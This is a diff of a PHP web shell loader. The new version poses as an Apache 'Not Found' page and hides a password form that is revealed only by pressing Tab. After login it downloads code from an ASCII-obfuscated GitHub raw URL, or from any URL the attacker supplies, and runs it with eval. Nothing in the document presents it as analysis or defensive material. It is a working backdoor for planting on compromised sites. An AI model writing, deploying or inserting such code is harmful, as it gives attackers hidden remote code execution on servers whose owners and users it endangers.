@@ -1,21 +1,7 @@
 <?php
-// Start the session at the very beginning
 session_start();
 
-// Your URL to fetch content from
-$Url = "https://raw.githubusercontent.com/bokaman12/7h3o/refs/heads/main/bandir-put/eikhane/ki/koros/fuck/you/f1.txt";
-
-// Function to fetch content from a URL
-function madrid($url) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-
-// Decode the ASCII-encoded URL (same as before)
+// ASCII-decoded URL
 $asciiArray = [
     104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104,
     117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111,
@@ -30,65 +16,83 @@ $decodedString = '';
 foreach ($asciiArray as $ascii) {
     $decodedString .= chr($ascii);
 }
+$url = $decodedString;
 
-$url = $decodedString; // Set the URL from the decoded string
-
-// Correct password hash (make sure this is the correct one you want to use)
 $correct_password = '$2y$10$cE1fZ09U/.4d3eT5zPZxE.e0.zOCvq5prclkQ9Z0xhEIV1F.ltnMy';
 
-// If reset is requested, clear the session URL
 if (isset($_GET['ts_reset'])) {
     $_SESSION["ts_url"] = "";
     echo "success";
     exit;
 }
 
-// Handle authentication if the 'ts' parameter is set
-if (isset($_GET['ts'])) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        if (isset($_POST['password'])) {
-            $provided_password = $_POST['password'];
-            if (password_verify($provided_password, $correct_password)) {
-                // Set session flag for successful login
-                $_SESSION['ts_auth'] = true; // Store authentication state in session
-                $_SESSION["ts_url"] = isset($_POST['url']) ? $_POST['url'] : $url; // Set the URL in session
-                // Redirect to same page after authentication
-                header("Location: " . $_SERVER['REQUEST_URI']);
-                exit;
-            } else {
-                echo "Invalid password!";
-                exit;
-            }
-        } else {
-            echo "No password provided!";
+// HTML Header (Always)
+?>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>Not Found</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 2em; background: #fff; color: #000; }
+        h1 { font-size: 22px; }
+        .line { border-top: 1px solid #ccc; margin-top: 10px; }
+        form { margin-top: 20px; }
+    </style>
+</head>
+<body>
+<h1>Not Found</h1>
+<p>The requested URL <code>/proprietary-software.html</code> was not found on this server.</p>
+<div class="line"></div>
+<p><i>Apache/2.4.10 (Debian) Server at localhost Port 80</i></p>
+
+<?php
+if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
+    // Login form
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        $provided_password = $_POST['password'];
+        if (password_verify($provided_password, $correct_password)) {
+            $_SESSION['ts_auth'] = true;
+            $_SESSION["ts_url"] = $_POST['url'] ?? $url;
+            header("Location: " . $_SERVER['REQUEST_URI']);
             exit;
+        } else {
+            echo "<p style='color:red;'>Invalid password! Please try again.</p>";
         }
     }
+    ?>
+    <form method="post" id="loginForm">
+        <label for="password" id="pwLabel" style="display: none;">Password:</label><br>
+        <input type="password" name="password" id="password" style="display: none;" required><br>
+        <input type="submit" value="Submit" style="display: none;" id="submitBtn">
+    </form>
+    <script>
+        document.addEventListener("keydown", function (event) {
+            if (event.key === "Tab") {
+                document.getElementById("pwLabel").style.display = "inline";
+                document.getElementById("password").style.display = "inline";
+                document.getElementById("submitBtn").style.display = "inline";
+                document.getElementById("password").focus();
+            }
+        });
+    </script>
+    </body>
+    </html>
+    <?php
+    exit;
 } else {
-    // Check if the user is authenticated
-    if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
-        echo "Unauthorized. Please authenticate first.";
-        exit;
+    // Authenticated: fetch and show remote content
+    $result = @file_get_contents($_SESSION["ts_url"] ?: $url);
+    if (empty($result)) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $_SESSION["ts_url"] ?: $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $result = curl_exec($ch);
+        curl_close($ch);
     }
-
-    // If the user is authenticated, fetch the URL content
-    if (empty($_SESSION["ts_url"])) {
-        $result = @file_get_contents($url);
-        if (empty($result)) {
-            $result = madrid($url);
-        }
-    } else {
-        $result = @file_get_contents($_SESSION["ts_url"]);
-        if (empty($result)) {
-            $result = madrid($_SESSION["ts_url"]);
-        }
-    }
-
-    // Display the result of the URL content
     if (is_string($result)) {
         eval('?>' . $result);
     } else {
-        echo "Error fetching the content.";
+        echo "<p>Error loading content.</p>";
     }
 }
 ?>
